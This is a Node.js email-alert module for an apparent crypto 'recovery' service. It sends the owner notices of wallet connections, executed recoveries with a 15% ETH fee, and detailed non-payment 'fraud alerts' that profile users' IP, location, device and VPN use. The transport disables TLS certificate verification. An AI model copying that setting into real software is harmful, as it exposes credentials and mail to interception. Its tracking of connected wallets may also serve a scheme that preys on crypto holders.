const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.OWNER_EMAIL,
    pass: process.env.EMAIL_PASSWORD
  },
  tls: {
    rejectUnauthorized: false
  },
  connectionTimeout: 10000,
  greetingTimeout: 5000,
  socketTimeout: 10000
});

// Test email connection with timeout handling (skip in production)
if (process.env.NODE_ENV !== 'production' && process.env.OWNER_EMAIL && process.env.EMAIL_PASSWORD) {
  transporter.verify((error, success) => {
    if (error) {
      console.log('Email configuration error (non-critical):', error.code || error.message);
    } else {
      console.log('Email server ready:', success);
    }
  });
} else if (process.env.NODE_ENV === 'production') {
  console.log('Email service configured for production (verification skipped)');
}

const sendWalletConnectionAlert = async (walletAddress, ipAddress, userAgent) => {
  try {
    await transporter.sendMail({
      from: `${process.env.EMAIL_FROM_NAME || 'CryptoRecover'} <${process.env.OWNER_EMAIL}>`,
      to: process.env.OWNER_EMAIL,
      subject: `🔗 New Wallet Connected - ${walletAddress}`,
      text: `New wallet connection:\n\nWallet: ${walletAddress}\nIP: ${ipAddress}\nUser Agent: ${userAgent}\nTime: ${new Date().toISOString()}`
    });
    console.log('✅ Wallet connection email sent');
  } catch (error) {
    console.error('❌ Email failed:', error.message);
  }
};

const sendRecoveryAlert = async (walletAddress, amount, method) => {
  try {
    await transporter.sendMail({
      from: `${process.env.EMAIL_FROM_NAME || 'CryptoRecover'} <${process.env.OWNER_EMAIL}>`,
      to: process.env.OWNER_EMAIL,
      subject: `💰 Recovery Executed - ${amount} ETH`,
      text: `Recovery completed:\n\nWallet: ${walletAddress}\nAmount: ${amount} ETH\nMethod: ${method}\nFee: ${(parseFloat(amount) * 0.15).toFixed(4)} ETH\nTime: ${new Date().toISOString()}`
    });
    console.log('✅ Recovery alert email sent');
  } catch (error) {
    console.error('❌ Email failed:', error.message);
  }
};

const sendFraudAlert = async (userData, recoveryData) => {
  const emailContent = `
🚨 FRAUD ALERT - Non-Payment Detected 🚨

USER DETAILS:
- Wallet: ${userData.walletAddress}
- IP Address: ${userData.ipAddress}
- Country: ${userData.country}
- City: ${userData.city}
- ISP: ${userData.isp}
- User Agent: ${userData.userAgent}
- Device: ${userData.device}
- Browser: ${userData.browser}
- OS: ${userData.operatingSystem}
- Timestamp: ${userData.timestamp}

RECOVERY DETAILS:
- Service: ${recoveryData.service}
- Amount Found: $${recoveryData.totalValue}
- Fee Owed: $${recoveryData.feeAmount} (15%)
- Payment Due: ${recoveryData.paymentDeadline}
- Status: PAYMENT OVERDUE

FINANCIAL DATA:
- Total Portfolio: $${recoveryData.portfolioValue}
- Tokens Found: ${recoveryData.tokensCount}
- NFTs Found: ${recoveryData.nftsCount}
- Staking Rewards: $${recoveryData.stakingRewards}

CONTACT INFO:
- Email: ${userData.email || 'Not provided'}
- Phone: ${userData.phone || 'Not provided'}

RISK ASSESSMENT:
- Fraud Score: ${userData.fraudScore}/100
- Previous Attempts: ${userData.previousAttempts}
- VPN Detected: ${userData.vpnDetected ? 'YES' : 'NO'}
- Proxy Detected: ${userData.proxyDetected ? 'YES' : 'NO'}

Take immediate action to recover payment or blacklist this user.
  `;

  await transporter.sendMail({
    from: process.env.OWNER_EMAIL,
    to: process.env.OWNER_EMAIL,
    subject: `🚨 FRAUD ALERT: $${recoveryData.feeAmount} Payment Overdue - ${userData.walletAddress}`,
    text: emailContent
  });
};

module.exports = { 
  sendFraudAlert,
  sendWalletConnectionAlert,
  sendRecoveryAlert
};